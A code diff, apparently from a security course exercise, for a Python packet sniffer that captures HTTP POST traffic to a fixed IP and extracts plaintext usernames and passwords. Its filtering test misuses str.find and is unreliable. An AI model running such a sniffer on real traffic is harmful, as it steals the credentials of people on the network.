@@ -14,16 +14,18 @@ def parse_packet(packet):
 
     Note: You can assume the entire HTTP request fits within one packet.
     """
+
     packet_str = str(packet)
+    # filter only POST requests - sending the credentials to the server
     if packet_str.find(WEBSITE) and packet_str.find("POST"):
-    	match = re.search('username=.*&password=.*', packet_str)
-    	if match:
-    		data = match.group(0)
-    		data_lst = data.split('&')
-    		username_str, password_str = data_lst[0], data_lst[1]
-    		username = username_str.split("=")[1]
-    		password = password_str.split("=")[1]
-    		return (username, password)
+        match = re.search('username=.*&password=.*', packet_str)
+        if match:
+            data = match.group(0)
+            data_lst = data.split('&')
+            username_str, password_str = data_lst[0], data_lst[1]
+            username = username_str.split("=")[1]
+            password = password_str.split("=")[1]
+            return (username, password)
     return None
 
 
@@ -31,8 +33,8 @@ def packet_filter(packet):
     """
     Filter to keep only HTTP traffic (port 80) from the client to the server.
     """
-    if S.IP in packet and S.TCP in packet:
-    	return packet[S.IP].dst == "132.66.11.65" and packet[S.TCP].dport == 80
+    if S.IP in packet and S.TCP in packet and S.Raw in packet:
+        return packet[S.IP].dst == "132.66.11.65" and packet[S.TCP].dport == 80
 
 
 def main(args):
